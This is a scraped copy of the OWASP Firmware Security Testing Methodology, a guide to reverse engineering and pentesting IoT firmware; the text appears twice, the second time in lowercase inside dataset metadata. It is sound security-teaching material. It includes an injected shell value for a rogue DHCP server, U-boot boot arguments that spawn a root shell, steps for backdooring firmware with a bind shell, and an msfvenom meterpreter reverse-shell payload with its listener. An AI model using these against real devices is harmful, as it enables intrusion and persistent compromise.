Guide and Application Security Verification Standard (ASVS).\nSpecific areas to review within an embedded device\u2019s web application are the following:\nDiagnostic or troubleshooting pages for potential command injection vulnerabilities\nAuthentication and authorization schemes are validated against the same framework across ecosystem applications as well as the firmware operating system platform\nTest whether default usernames and passwords are used\nPerform directory traversal and content discovery on web pages to identify debug or testing functionality\nAsses SOAP/XML and API communication for input validation and sanitization vulnerabilities such as XSS and XXE\nFuzz application parameters and observe exceptions and stack traces\nTailor targeted payloads against embedded web application services for common C/C++ vulnerabilities such as memory corruption vulnerabilities, format string flaws, and integer overflows.\nDepending on the product and its application interfaces, test cases will differ.\nBootloader testing\nWhen modifying device start up and bootloaders such as U-boot, attempt the following:\nAttempt to access the bootloaders interpreter shell by pressing \"0\", space or other identified \u201cmagic codes\u201d during boot.\nModify configurations to execute a shell command such as adding 'init=/bin/sh' at the end of boot arguments\n#printenv\n#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3\nmtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 int=/bin/sh\n#saveenv\n#boot\nSetup a tftp server to load images over the network locally from your workstation. Ensure the device has network access.\n#setenv ipaddr 192.168.2.2 #local IP of the device\n#setenv serverip 192.168.2.1 #tftp server IP\n#saveenv\n#reset\n#ping 192.168.2.1 #check if network access is available\n#tftp ${loadaddr} uImage-3.6.35 #loadaddr takes two arguments: the address to load the file into and the filename of the image on the TFTP server\nUse ubootwrite.py to write the uboot-image and push a modified firmware to gain root\nCheck for enabled debug features such as:\nverbose logging\nloading arbitrary kernels\nbooting from untrusted sources\n*Use caution: Connect one pin to ground, watch device boot up sequence, before the kernel decompresses, short/connect the grounded pin to a data pin (DO) on an SPI flash chip\n*Use caution: Connect one pin to ground, watch device boot up sequence, before the kernel decompresses, short/connect the grounded pin to pins 8 and 9 of the NAND flash chip at the moment U-boot decompresses the UBI image\n*Review the NAND flash chip\u2019s datasheet prior to shorting pins\nConfigure a rogue DHCP server with malicious parameters as input for a device to ingest during a PXE boot\nUse Metasploit\u2019s (MSF) DHCP auxiliary server and modify the \u2018FILENAME\u2019 parameter with command injection commands such as \u2018a\";/bin/sh;#\u2019 to test input validation for device startup procedures.\n*Hardware security testing\nFirmware integrity testing\nAttempt to upload custom firmware and/or compiled binaries for integrity or signature verification flaws. For example, compile a backdoor bind shell that starts upon boot using the following steps.\nExtract firmware with firmware-mod-kit (FMK)\nIdentify the target firmware architecture and endianness\nBuild a cross compiler with Buildroot or use other methods that suits your environment\nUse cross compiler to build the backdoor\nCopy the backdoor to extracted firmware /usr/bin\nCopy appropriate QEMU binary to extracted firmware rootfs\nEmulate the backdoor using chroot and QEMU\nConnect to backdoor via netcat\nRemove QEMU binary from extracted firmware rootfs\nRepackage the modified firmware with FMK\nTest backdoored firmware by emulating with firmware analysis toolkit (FAT) and connecting to the target backdoor IP and port using netcat\n$$$$$$$$$$$$$\nIf a root shell has already been obtained from dynamic analysis, bootloader manipulation, or hardware security testing means, attempt to execute precompiled malicious binaries such as implants or reverse shells. Consider using automated payload/implant tools used for command and control (C&C) frameworks. For example, Metasploit framework and \u2018msfvenom\u2019 can be leveraged using the following steps.\nIdentify the target firmware architecture and endianness\nUse msfvenom to specify the appropriate target payload (-p), attacker host IP (LHOST=), listening port number (LPORT=) filetype (-f), architecture (--arch), platform (--platform linux or windows), and the output file (-o). For example, msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux\nTransfer the payload to the compromised device (e.g. Run a local webserver and wget/curl the payload to the filesystem) and ensure the payload has execution permissions\nPrepare Metasploit to handle incoming requests. For example, start Metasploit with msfconsole and use the following settings according to the payload above: use exploit/multi/handler,\nset payload linux/armle/meterpreter_reverse_tcp\nset LHOST 192.168.1.245 #attacker host IP\nset LPORT 445 #can be any unused port\nset ExitOnSession false\nexploit -j -z\nExecute the meterpreter reverse \ud83d\udc1a on the compromised device\nWatch meterpreter sessions open\nPerform post exploitation activities\n$$$$$$$$$$$$$$$$\nIf possible, identify a vulnerability within startup scripts to obtain persistent access to a device across reboots. Such vulnerabilities arise when startup scripts reference, symbolically link, or depend on code located in untrusted mounted locations such as SD cards, and flash volumes used for storage data outside of root filesystems.\n[Stage 8] Runtime analysis\nRuntime analysis involves attaching to a running process or binary while a device is running in its normal or emulated environment. Basic runtime analysis steps are provided below:\nsudo chroot . ./qemu-arch -L <optionalLibPath> -g <gdb_port> <binary>\nAttach gdb-multiarch or use IDA to emulate the binary\nSet breakpoints for functions identified during step 4 such as memcpy, strncpy, strcmp, etc.\nExecute large payload strings to identify overflows or process crashes using a fuzzer\nMove to step 8 if a vulnerability is identified\nTools that may be helpful are (non-exhaustive):\ngdb-multiarch\nPeda\nFrida\nptrace\nstrace\nIDA Pro\nGhidra\nBinary Ninja\nHopper\n[Stage 9] Binary Exploitation\nAfter identifying a vulnerability within a binary from previous steps, a proper proof-of-concept (PoC) is required to demonstrate the real-world impact and risk. Developing exploit code requires programming experience in lower level languages (e.g. ASM, C/C++, shellcode, etc.) as well as background within the particular target architecture (e.g. MIPS, ARM, x86 etc.). PoC code involves obtaining arbitrary execution on a device or application by controlling an instruction in memory.\nIt is not common for binary runtime protections (e.g. NX, DEP, ASLR, etc.) to be in place within embedded systems however when this happens, additional techniques may be required such as return oriented programming (ROP). ROP allows an attacker to implement arbitrary malicious functionality by chaining existing code in the target process/binary's code known as gadgets. Steps will need to be taken to exploit an identified vulnerability such as a buffer overflow by forming a ROP chain. A tool that can be useful for situations like these is Capstone's gadget finder or ROPGadget- https://github.com/JonathanSalwan/ROPgadget.\nUtilize the following references for further guidance:\nhttps://azeria-labs.com/writing-arm-shellcode/\nhttps://www.corelan.be/index.php/category/security/exploit-writing-tutorials/\nFirmware and binary analysis tool index\nA combination of tools will be used throughout assessing firmware. Listed below, are commonly used tools.\nFirmware Analysis Comparison Toolkit (FACT)\nFWanalyzer\nFirmwalker\nFirmware Modification Kit\nFirmadyne\nByteSweep\nBinwalk\nFlashrom\nOpenocd\nAngr binary analysis framework\nBinary Analysis Tool\nBinary Analysis Platform\nBINSEC\nChecksec.sh\nCHIPSEC\nCapstone Engine\nQiling Advanced Binary Emulation Framework\nTriton dynamic binary analysis (DBA) framework\nVulnerable firmware\nTo practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.\nOWASP IoTGoat\nhttps://github.com/OWASP/IoTGoat\nThe Damn Vulnerable Router Firmware Project\nhttps://github.com/praetorian-code/DVRF\nDamn Vulnerable ARM Router (DVAR)\nhttps://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html\nARM-X\nhttps://github.com/therealsaumil/armx#downloads\nAzeria Labs VM 2.0\nhttps://azeria-labs.com/lab-vm-2-0/\nDamn Vulnerable IoT Device (DVID)\nhttps://github.com/Vulcainreo/DVID\nFeedback and contributing\nIf you would like to contribute or provide feedback to improve this methodology, contact Aaron.guzman@owasp.org (@scriptingxss). Make sure to open up an issue or a pull request, and we'll make sure to tend to it!\nSpecial thanks to our sponsors Cisco Meraki, OWASP Inland Empire, and OWASP Los Angeles as well as Jos\u00e9 Alejandro Rivas Vidal for his careful review.\nThe full list of contributors can be found via https://github.com/scriptingxss/owasp-fstm/graphs/contributors.\nLicense\nCreative Commons Attribution Share Alike 4.0 International", "link": "https://github.com/scriptingxss/owasp-fstm", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "description\nfstm is composed of nine stages tailored to enable security researchers, software developers, hobbyists, and information security professionals with conducting firmware security assessments.\nowasp firmware security testing methodology\nwhether network connected or standalone, firmware is the center of controlling any embedded device. as such, it is crucial to understand how firmware can be manipulated to perform unauthorized functions and potentially cripple the supporting ecosystem\u2019s security. to get started with performing security testing and reverse engineering of firmware, use the following methodology as guidance when embarking on an upcoming assessment. the methodology is composed of nine stages tailored to enable security researchers, software developers, consultants, hobbyists, and information security professionals with conducting firmware security assessments.\nstage description\n1. information gathering and reconnaissance acquire all relative technical and documentation details pertaining to the target device's firmware\n2. obtaining firmware attain firmware using one or more of the proposed methods listed\n3. analyzing firmware examine the target firmware's characteristics\n4. extracting the filesystem carve filesystem contents from the target firmware\n5. analyzing filesystem contents statically analyze extracted filesystem configuration files and binaries for vulnerabilities\n6. emulating firmware emulate firmware files and components\n7. dynamic analysis perform dynamic security testing against firmware and application interfaces\n8. runtime analysis analyze compiled binaries during device runtime\n9. binary exploitation exploit identified vulnerabilities discovered in previous stages to attain root and/or code execution\nthe following sections will further detail each stage with supporting examples where applicable. consider visiting the owasp internet of things project page and github repository for the latest methodology updates and forthcoming project releases.\na preconfigured ubuntu virtual machine (embedos) with firmware testing tools used throughout this document can be downloaded via the following link. details regarding embedos\u2019 tools can be found on github within the following repository https://github.com/scriptingxss/embedos.\n[stage 1] information gathering and reconnaissance\nduring this stage, collect as much information about the target as possible to understand its overall composition underlying technology. attempt to gather the following:\nsupported cpu architecture(s)\noperating system platform\nbootloader configurations\nhardware schematics\ndatasheets\nlines-of-code (loc) estimates\nsource code repository location\nthird-party components\nopen source licenses (e.g. gpl)\nchangelogs\nfcc ids\ndesign and data flow diagrams\nthreat models\nprevious penetration testing reports\nbug tracking tickets (e.g. jira and bug bounty platforms such as bugcrowd or hackerone)\nthe above listed information should be gathered prior to security testing fieldwork via a questionnaire or intake form. ensure to leverage internal product line development teams to acquire accurate and up to date data. understand applied security controls as well as roadmap items, known security issues, and most concerning risks. if needed, schedule follow up deep dives on particular features in question. assessments are most successful within a collaborative environment.\nwhere possible, acquire data using open source intelligence (osint) tools and techniques. if open source software is used, download the repository and perform both manual as well as automated static analysis against the code base. sometimes, open source software projects already use free static analysis tools provided by vendors that provide scan results such as coverity scan and semmle\u2019s lgtm. for example, the screenshots below shows snippets of das u-boot\u2019s coverity scan results.\nfigure : u-boot coverity scan\nfigure : u-boot coverity scan analysis\nbelow are screenshots of dropbear results from lgtm\u2019s analysis.\nfigure : lgtm dropbear alerts\nfigure : lgtm dropbear results\nwith the information at hand, a light threat model exercise should be performed mapping attack surfaces and impact areas that show the most value in the event of compromise.\n[stage 2] obtaining firmware\nto begin reviewing firmware contents, the firmware image file must be acquired. attempt to obtain firmware contents using one or more of the following methods:\ndirectly from the development team, manufacturer/vendor or client\nbuild from scratch using walkthroughs provided by the manufacturer\nfrom the vendor's support site\ngoogle dork queries targeted towards binary file extensions and file sharing platforms such as dropbox, box, and google drive\nit\u2019s common to come across firmware images through customers who upload contents to forums, blogs, or comment on sites where they contacted the manufacturer to troubleshoot an issue and were given firmware via a zip or flash drive sent.\nman-in-the-middle (mitm) device communication during updates\n*download builds from exposed cloud provider storage locations such as amazon web services (aws) s3 buckets\nextract directly from hardware via uart, jtag, picit, etc.\nsniff serial communication within hardware components for update server requests\nvia a hardcoded endpoint within the mobile or thick applications\ndumping firmware from the bootloader (e.g. u-boot) to flash storage or over the network via tftp\nremoving the flash chip (e.g. spi) or mcu from the board for offline analysis and data extraction (last resort).\nyou will need a supported chip programmer for flash storage and/or the mcu.\n*note: ensure to follow local laws and regulations when downloading data from exposed cloud provider storage services.\neach of the listed methods vary in difficulty and should not be considered an exhaustive list. select the appropriate method according to the project objectives and rules of engagement. if possible, request both a debug build and release build of firmware to maximize testing coverage use cases in the event debug code or functionality is compiled within a release.\n[stage 3] analyzing firmware\nonce the firmware image is obtained, explore aspects of the file to identify its characteristics. use the following steps to analyze firmware file types, potential root filesystem metadata, and gain additional understanding of the platform it's compiled for.\nleverage utilities such as:\nfile <bin>\nstrings\nstrings -n5 <bin>\nstrings -n16 <bin>#longer than 16\nstrings -tx <bin> #print offsets in hex\nbinwalk <bin>\nhexdump -c -n 512 <bin> > hexdump.out\nhexdump -c <bin> | head # might find signatures in header\nfdisk -lu <bin> #lists a drives partition and filesystems if multiple\nif none of the above methods provide any useful data, the following is possible:\nbinary may be baremetal\nbinary may be for a real time operating system (rtos) platform with a custom filesystem\nbinary may be encrypted\nif the binary may be encrypted, check the entropy using binwalk with the following command:\n$ binwalk -e <bin>\nlow entropy = not likely to be encrypted\nhigh entropy = its likely encrypted (or compressed in some way).\nalternate tools are also available using binvis online and the standalone application.\nbinvis\nhttps://code.google.com/archive/p/binvis/\nhttps://binvis.io/#/\n[stage 4] extracting the filesystem\nthis stage involves looking inside firmware and parsing relative filesystem data to start identifying as many potential security issues as possible. use the following steps to extract firmware contents for review of uncompiled code and device configurations used in following stages. both automated and manual extractions methods are shown below.\nuse the following tools and methods to extract filesystem contents:\n$ binwalk -ev <bin>\nfiles will be extracts to \" _binaryname/filesystemtype/\"\nfilesystem types: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs\n2a. sometimes, binwalk will not have the magic byte of the filesystem in its signatures. in these cases, use binwalk to find the offset of the filesystem and carve the compressed filesystem from the binary and manually extract the filesystem according to its type using the steps below.\n$ binwalk dir850l_revb.bin\ndecimal hexadecimal description\n----------------------------------------------------------------------------- ---\n0 0x0 dlob firmware header, boot partition: \"\"\"\"dev=/dev/mtdblock/1\"\"\"\"\n10380 0x288c lzma compressed data, properties: 0x5d, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes\n1704052 0x1a0074 packimg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes\n1704084 0x1a0094 squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41\n2b. run the following dd command carving the squashfs filesystem.\n$ dd if=dir850l_revb.bin bs=1 skip=1704084 of=dir.squashfs\n8257536+0 records in\n8257536+0 records out\n8257536 bytes (8.3 mb, 7.9 mib) copied, 12.5777 s, 657 kb/s\nalternatively, the following command could also be run.\n$ dd if=dir850l_revb.bin bs=1 skip=$((0x1a0094)) of=dir.squashfs\n2c. for squashfs (used in the example above)\n$ unsquashfs dir.squashfs\nfiles will be in \"squashfs-root\" directory afterwards.\n2d. cpio archive files\n$ cpio -ivd --no-absolute-filenames -f <bin>\n2f. for jffs2 filesystems\n$ jefferson rootfsfile.jffs2\n2d. for ubifs filesystems with nand flash\n$ ubireader_extract_images -u ubi -s <start_offset> <bin>\n$ ubidump.py <bin>\n[stage 5] analyzing filesystem contents\nduring this stage, clues are gathered for dynamic and runtime analysis stages. investigate if the target firmware contains the following (non-exhaustive):\nlegacy insecure network daemons such as telnetd (sometimes manufactures rename binaries to disguise )\nhardcoded credentials (usernames, passwords, api keys, ssh keys, and backdoor variants )\nhardcoded api endpoints and backend server details\nupdate server functionality that could be used as an entry point\nreview uncompiled code and start up scripts for remote code execution\nextract compiled binaries to be used for offline analysis with a disassembler for future steps\nstatically analyze filesystem contents and uncompiled code manually or leveraging automation tools such as firmwalker that parse the following:\netc/shadow and etc/passwd\nlist out the etc/ssl directory\nsearch for ssl related files such as .pem, .crt, etc.\nsearch for configuration files\nlook for script files\nsearch for other .bin files\nlook for keywords such as admin, password, remote, aws keys, etc.\nsearch for common web servers used on iot devices\nsearch for common binaries such as ssh, tftp, dropbear, etc.\nsearch for banned c functions\nsearch for common command injection vulnerable functions\nsearch for urls, email addresses and ip addresses\nand more\u2026\nthe following subsections introduce open source automated firmware analysis tools.\nfirmwalker\nexecute firmwalker within it\u2019s directory in ~/tools/firmwalker and point firmwalker to the absolute path of the extracted filesystem\u2019s root directory. firmwalker uses information in the \"/data/\u201d directory for parsing rules. a custom fork modified by aaron guzman with additional checks can be found on github at https://github.com/scriptingxss/firmwalker. the following examples show the usage of firmwalker used on owasp\u2019s iotgoat. additional vulnerable firmware projects are listed in the vulnerable firmware section at the end of the document.\n$ ./firmwalker.sh /home/embedos/firmware/ _iotgoat-rpi-2.img.extracted/squashfs-root/\nsee the firmwalker output below.\ntwo files will be generated, firmwalker.txt and firmwalkerappsec.txt. these output files should be manually reviewed.\nfirmware analysis comparison toolkit (fact )\nfortunately, multiple open source automated firmware analysis tools are available. fact features include the following:\nidentification of software components such as operating system, cpu architecture, and third-party components along with their associated version information\nextraction of firmware filesystem (s ) from images\ndetection of certificates and private keys\ndetection of weak implementations mapping to common weakness enumeration (cwe)\nfeed & signature-based detection of vulnerabilities\nbasic static behavioral analysis\ncomparison (diff) of firmware versions and files\nuser mode emulation of filesystem binaries using qemu\ndetection of binary mitigations such as nx, dep, aslr, stack canaries, relro, and fortify_source\nrest api\nand more...\nbelow are instructions for using firmware analysis comparison toolkit within the companion preconfigured virtual machine.\ntip: it is recommended to run fact with a computer that has 16 cores 64gb ram although the -----> tool !!!  can run with a minimum of 4 cores and 8gb of ram at a much slower pace. scan output results vary on the allocated resources given to the virtual machine. the more resources, the faster fact will complete scan submissions.\n$ cd ~/tools/fact_core/\n$ sudo ./start_all_installed_fact_components\nnavigate to http://127.0.0.1:5000 in browser\nfigure : fact dashboard\nupload firmware components to fact for analysis. in the screenshot below, the compressed complete firmware with its root filesystem will be uploaded and analyzed.\nfigure : fact upload\ndepending on the hardware resources given to fact, the analysis results will appear with its scan results upon a given time. this process can take hours if minimal resources are allocated.\nfigure : fact iotgoat\nfigure : fact iotgoat exploit mitigation results\ndisassemble suspect target binaries with data gathered from fact using ida pro, ghidra, hopper, capstone, or binary ninja. analyze binaries for potential remote code execution system calls, strings, function lists, memory corruption vulnerabilities, and identify xrefs to system() or alike function calls. note potential vulnerabilities to use for upcoming steps.\nthe following screenshot shows the \u201cshellback\u201d binary disassembled using ghidra.\nfigure : shellback ghidra analysis\ncommon binary analysis consist of reviewing the following:\nstack canaries enabled or disabled\n$ readelf -aw bin/*| grep stack_chk_fail\n$ mips-buildroot-linux-uclibc-objdump -d bin/binary | grep stack_chk_fail\nposition-independent executable (pie) enabled or disabled\npie disabled\n$ readelf -h <bin> | grep -q 'type:[[:space:]]*exec'\npie enabled\n$ readelf -h <bin> | grep 'type:[[:space:]]*dyn'\ndso\n$ readelf -d <bin> | grep -q 'debug'\nsymbols\n$ readelf --syms <bin>\n$ nm <bin>\nrecognizable strings\n-el specifies little-endian characters 16-bits wide (e.g. utf-16).\nuse -eb for big endian\nprints any ascii strings longer than 16 to stdout\nthe -t flag will return the offset of the string within the file.\n-tx will return it in hex format, t-to in octal and -td in decimal.\nuseful for cross-referencing with a hex editor, or want to know where in the file your string is.\nstrings -n5 <bin>\nstrings -el <bin>\nstrings -n16 <bin>\nstrings -tx <bin>\nnon-executable (nx) enabled or disabled\n$ readelf -lw bin/<bin>| grep stack\ngnu_stack 0x000000 0x00000000 0x00000000 0x00000 0x00000 rwe 0x4\nthe 'e' indicates that the stack is executable.\n$ execstack bin/*\nx bin/ash\nx bin/busybox\nrelocations read-only (relro) configuration\nfull relro:\n$ readelf -d binary | grep bind_now\npartial relro:\n$ readelf -d binary | grep gnu_relro\na script that automates checking many of the above binary properties is checksec.sh. below, are two examples of using the script.\n> ./checksec --file=/home/embedos/firmware/_iotgoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox\nrelro stack canary nx pie rpath runpath symbols fortify fortified fortifiable file\npartial relro no canary found nx enabled no pie no rpath no runpath no symbols no 0 0 /home/embedos/firmware/_iotgoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox\n> ./checksec --file=/home/embedos/firmware/_iotgoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback\nrelro stack canary nx pie rpath runpath symbols fortify fortified fortifiable file\npartial relro no canary found nx enabled no pie no rpath no runpath no symbols no 0 0 /home/embedos/firmware/_iotgoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback\nfigure : checksec.sh\nfor microsoft binaries (exe & dll), use pesecurity to check for aslr, dep, safeseh, strongnaming, authenticode, control flow guard, and highentropyva.\n[stage 6] emulating firmware\nusing details and clues identified in previous steps, firmware as well as it\u2019s encapsulated binaries must be emulated to verify potential vulnerabilities. to accomplish emulating firmware, there are a few approaches listed below.\npartial emulation (user space) - emulation of standalone binaries derived from a firmware's extracted filesystem such as /usr/bin/shellback\nfull system emulation - emulation of the full firmware and start up configurations leveraging fake nvram.\nemulation using a real device or virtual machine - at times, partial or full emulation may not work due to a hardware or architecture dependencies. if the architecture and endianness match a device owned such as a raspberry pie, the root filesystem or specific binary can be transferred to the device for further testing. this method also applies to pre built virtual machines using the same architecture and endianness as the target.\npartial emulation (user-mode emulation)\nto begin partially emulating binaries, the cpu architecture and endianness must be known for selecting the appropriate qemu emulation binary in the following steps.\n$ binwalk -y <bin>\n$ readelf -h <bin>\nel - little endian\neb - big endian\nbinwalk can be used identify endianness for packaged firmware binaries (not from binaries within extracted firmware) using the command below.\n$ binwalk -y upg_ipc8120p-w7-m20-hi3516c-20160328_165229.ov\ndecimal hexadecimal description\n--------------------------------------------------------------------------------\n3480 0xd98 arm executable code, 32-bit, little endian, at least 1154 valid instructions\nafter the cpu architecture and endianness have been identified, locate the appropriate qemu binary to perform partial emulation (not for emulating the full firmware, but binaries with the extracted firmware.)\ntypically, in:\n/usr/local/qemu-arch or /usr/bin/qemu-arch\ncopy the applicable qemu binary into the extracted root filesystem. the second command shows copying the static arm qemu binary to the extracted root filesystem within a zsh shell showing the absolute path.\n> cp /usr/local/qemu-arch /extractedrootfs/\n/home/embedos/firmware/_dir850l_revb_fw207wwb05_h1ke_beta1.decrypted.extracted/squashfs-root\n> cp /usr/bin/qemu-arm-static .\nexecute the arm binary (or appropriate arch) to emulate using qemu and chroot with the following command:\n$ sudo chroot . ./qemu-arch <binarytoemulate>\nthe following example shows busybox emulated within a typical x64 architecture an attacker machine is likely using.\n> sudo chroot . ./qemu-arm-static bin/busybox ls\n[sudo] password for embedos:\nbin etc overlay rom sys var\ndev lib proc root tmp www\ndnsmasq_setup.sh mnt qemu-arm-static sbin usr\nbelow, is an example of emulating a service that listens on port 5515.\n> sudo chroot . ./qemu-arm-static usr/bin/shellback\nalso, the same service can be emulated with qiling framework.\n> ./qltool run --console false -f ~/_iotgoat-x86.img.extracted/squashfs-root/usr/bin/shellback --rootfs ~/_iotgoat-x86.img.extracted/squashfs-root\nin another terminal, check if the service is listening locally and try to connect to it with netcat.\n> sudo lsof -i :5515\ncommand pid user fd type device size/off node name\nqemu-arm- 13264 root 3u ipv4 662221 0t0 tcp *:5515 (listen)\n> nc -nv 127.0.0.1 5515\nconnection to 127.0.0.1 5515 port [tcp/*] succeeded!\n[***]successfully connected to iotgoat's backdoor[***]\nsometimes, requests are dispatched to the cgi binary by the http server. by simply emulating the cgi binary, it's possible to analyze the process procedure or verify the vulnerability without setting up a http server. the following example issues a get request to a mips cgi binary.\n~/dir850l/squashfs-root/htdocs/web$ ls -l captcha.cgi\nlrwxrwxrwx 1 root root 14 oct 17 2017 captcha.cgi -> /htdocs/cgibin\n# fix the broken symbolic link\n~/dir850l/squashfs-root/htdocs/web$ rm captcha.cgi && ln -s ../cgibin captcha.cgi\n~/dir850l/squashfs-root$ sudo chroot . ./qemu-mips-static -e request_method=\"get\" -e request_uri=\"/captcha.cgi\" -e remote_addr=\"192.168.1.1\" -e content_type=\"text/html\" /htdocs/web/captcha.cgi\nhttp/1.1 200 ok\ncontent-type: text/xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?><captcha>\n<result>fail</result><message>no session</message>\n</captcha>\nwith the target binary emulated, interact with its interpreter or listening service. fuzz its application and network interfaces as noted in the next phase.\nfull-system emulation\nwhen possible, use automation tools such as firmadyne, firmware analysis toolkit, or arm-x firmware emulation framework to perform full emulation of firmware. these tools are essentially wrappers for qemu and other environmental functions such as nvram.\nhttps://github.com/attify/firmware-analysis-toolkit\nhttps://github.com/therealsaumil/armx/\nhttps://github.com/getcujo/mips-x\nhttps://github.com/firmadyne/firmadyne\nhttps://github.com/qilingframework/qiling#qltool\nusing firmware analysis toolkit, simply execute the following command:\nsudo python3 ./fat.py iotgoat-rpi-2.img --qemu 2.5.0\n__ _\n/ _| | |\n| |_ __ _ | |_\n| _| / _` | | __|\n| | | (_| | | |_\n|_| \\__,_| \\__|\nwelcome to the firmware analysis toolkit - v0.3\noffensive iot exploitation training http://bit.do/offensiveiotexploitation\nby attify - https://attify.com | @attifyme\n[+] firmware: iotgoat-rpi-2.img\n[+] extracting the firmware...\n[+] image id: 1\n[+] identifying architecture...\n[+] architecture: armel\n[+] building qemu disk image...\n[+] setting up the network connection, please standby...\n[+] network interfaces: [('eth0', '192.168.1.1')]\n[...]\nadding route to 192.168.1.1...\nstarting firmware emulation... use ctrl-a + x to exit\n[ 0.000000] booting linux on physical cpu 0x0\n[ 0.000000] linux version 4.1.17+ (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (gcc) ) #1 thu feb 18 01:05:21 utc 2016\n[ 0.000000] cpu: armv7 processor [412fc0f1] revision 1 (armv7), cr=10c5387d\n[ 0.000000] cpu: pipt / vipt nonaliasing data cache, pipt instruction cache\nbusybox v1.28.4 () built-in shell (ash)\n.--,\\\\\\__\n\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 `-. a`-.__\n\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 | ')\n\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d / \\ _.-'-,`;\n\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u255d / | { /\n\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551 / | { /\n\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d ..-\"``~\"-' ; )\n\u2566\u250c\u2500\u2510\u2554\u2566\u2557\u2554\u2550\u2557\u250c\u2500\u2510\u250c\u2500\u2510\u250c\u252c\u2510 ;' `\n\u2551\u2502 \u2502 \u2551 \u2551 \u2566\u2502 \u2502\u251c\u2500\u2524 \u2502 ;' `\n\u2569\u2514\u2500\u2518 \u2569 \u255a\u2550\u255d\u2514\u2500\u2518\u2534 \u2534 \u2534 ;' `\n------------------------------------------------------------ ;'\ngithub: https://github.com/owasp/iotgoat\n------------------------------------------------------------\nroot@iotgoat:/#\nnote: modifications to these tools may be required if the firmware contains an uncommon compression, filesystem, or unsupported architecture.\n[stage 7] dynamic analysis\nin this stage, perform dynamic testing while a device is running in its normal or emulated environment. objectives in this stage may vary depending on the project and level of access given. typically, this involves tampering of bootloader configurations, web and api testing, fuzzing (network and application services), as well as active scanning using various toolsets to acquire elevated access (root) and/or code execution.\ntools that may be helpful are (non-exhaustive):\nburp suite\nowasp zap\ncommix\nfuzzers such as - american fuzzy loop (afl)\nnetwork and protocol fuzzers such as - mutiny, boofuzz, and kitty.\nnmap\nncrack\nmetasploit\nembedded web application testing\nreference industry standard web methodologies such as owasp\u2019s testing guide and application security verification standard (asvs).\nspecific areas to review within an embedded device\u2019s web application are the following:\ndiagnostic or troubleshooting pages for potential command injection vulnerabilities\nauthentication and authorization schemes are validated against the same framework across ecosystem applications as well as the firmware operating system platform\ntest whether default usernames and passwords are used\nperform directory traversal and content discovery on web pages to identify debug or testing functionality\nasses soap/xml and api communication for input validation and sanitization vulnerabilities such as xss and xxe\nfuzz application parameters and observe exceptions and stack traces\ntailor targeted payloads against embedded web application services for common c/c++ vulnerabilities such as memory corruption vulnerabilities, format string flaws, and integer overflows.\ndepending on the product and its application interfaces, test cases will differ.\nbootloader testing\nwhen modifying device start up and bootloaders such as u-boot, attempt the following:\nattempt to access the bootloaders interpreter shell by pressing \"0\", space or other identified \u201cmagic codes\u201d during boot.\nmodify configurations to execute a shell command such as adding 'init=/bin/sh' at the end of boot arguments\n#printenv\n#setenv bootargs=console=ttys0,115200 mem=63m root=/dev/mtdblock3\nmtdparts=sflash:<partitiioninfo> rootfstype=<fstype> haseeprom=0 5srst=0 int=/bin/sh\n#saveenv\n#boot\nsetup a tftp server to load images over the network locally from your workstation. ensure the device has network access.\n#setenv ipaddr 192.168.2.2 #local ip of the device\n#setenv serverip 192.168.2.1 #tftp server ip\n#saveenv\n#reset\n#ping 192.168.2.1 #check if network access is available\n#tftp ${loadaddr} uimage-3.6.35 #loadaddr takes two arguments: the address to load the file into and the filename of the image on the tftp server\nuse ubootwrite.py to write the uboot-image and push a modified firmware to gain root\ncheck for enabled debug features such as:\nverbose logging\nloading arbitrary kernels\nbooting from untrusted sources\n*use caution: connect one pin to ground, watch device boot up sequence, before the kernel decompresses, short/connect the grounded pin to a data pin (do) on an spi flash chip\n*use caution: connect one pin to ground, watch device boot up sequence, before the kernel decompresses, short/connect the grounded pin to 